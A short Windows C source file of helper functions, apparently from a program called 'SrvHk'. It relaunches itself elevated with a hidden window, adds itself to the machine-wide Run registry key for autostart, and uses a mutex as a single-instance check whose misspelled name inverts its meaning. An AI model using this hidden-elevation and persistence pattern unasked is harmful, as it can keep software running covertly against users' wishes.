#include "../inc/Utils.h"
#include <tchar.h>
#include <shellapi.h>

void RunAsAdmin(PTCHAR Params)
{
	TCHAR FilePath[MAX_PATH];
	DWORD Len = GetModuleFileName(NULL, FilePath, MAX_PATH);
	if(Len <= 0)
		return;

	SHELLEXECUTEINFO shExecInfo;
	shExecInfo.cbSize       = sizeof(shExecInfo);
	shExecInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
	shExecInfo.hwnd         = NULL;
	shExecInfo.lpVerb       = _T("runas");
	shExecInfo.lpFile       = FilePath;
	shExecInfo.lpParameters = Params;
	shExecInfo.lpDirectory  = NULL;
	shExecInfo.nShow        = SW_HIDE;
	shExecInfo.hInstApp     = NULL;

	if(ShellExecuteEx(&shExecInfo))
		CloseHandle(shExecInfo.hProcess);
}

void AddToAutoload(void)
{
	TCHAR FilePath[MAX_PATH];
	DWORD Len = GetModuleFileName(NULL, FilePath, MAX_PATH);
	if(Len <= 0)
		return;

	HKEY hKey;
	LONG Res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
	if(Res == ERROR_SUCCESS)
	{
		Res = RegSetValueEx(hKey, _T("SrvHk"), 0, REG_SZ, (LPBYTE)FilePath, Len*sizeof(FilePath[0]));
		RegCloseKey(hKey);
	}
}

BOOL IsFisrtRun(void)
{
	HANDLE hMutex = CreateMutex(NULL, TRUE, _T("SrvHk"));
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return TRUE;
	}
	return FALSE;
}